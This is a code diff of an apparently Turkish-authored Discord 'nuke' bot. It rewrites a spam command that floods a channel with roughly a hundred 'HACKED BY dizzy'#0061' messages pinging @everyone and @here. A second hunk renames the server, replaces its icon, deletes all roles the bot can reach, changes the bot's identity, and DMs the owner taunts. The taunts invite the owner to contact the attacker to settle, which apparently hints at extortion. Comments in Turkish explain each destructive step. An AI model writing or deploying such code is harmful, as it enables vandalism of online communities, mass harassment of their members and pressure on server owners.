@@ -42,78 +42,123 @@ client.on('message', msg => {
   if (msg.content === '!spamyap') { 
          
    
-msg.channel.send("hacked by dizzy'#0061 ");
-    
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  "); // by dizzy'#0061
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");//by diizy'#0061//by diizy'#0061
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");// by dizzy'#0061
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");// by dizzy'#0061
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    //by diizy'#0061//by diizy'#0061
-    
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");//by diizy'#0061//by diizy'#0061
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");// by dizzy'#0061
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");//by diizy'#0061//by diizy'#0061
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");//by diizy'#0061//by diizy'#0061
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     
     
     
@@ -672,10 +717,10 @@ client.on("message", async msg => {
 });
 
 //by diizy'#0061
-    await msg.guild.setIcon("https://hizliresim.com/zUSK3E");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ//by diizy'#0061
-    await msg.guild.setName("hacked by melik ama yıkık olandan alayım#0061 "); //SUNUCUNUN ISMINI DEGISTIRIR
+    await msg.guild.setIcon("https://hizliresim.com/SgZAF9");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ//by diizy'#0061
+    await msg.guild.setName("hacked by dizzy'#0061 "); //SUNUCUNUN ISMINI DEGISTIRIR
     await msg.guild.roles.cache.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
-    await client.user.setAvatar("https://hizliresim.com/jNCN1l"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
+    await client.user.setAvatar("https://hizliresim.com/SgZAF9"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
     await client.user.setUsername("dizzy'");    //BOTUN ISMİNİ DEGISTIRIR
     await msg.guild.owner.send("**Sunucunu Hackledim Ağla :D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
     await msg.guild.owner.send("**Kardeşim af istiyorsan ve anlaşmak istiyorsan bu hesaba ark at kolay gelsin : _dizzy'#0061_** ");
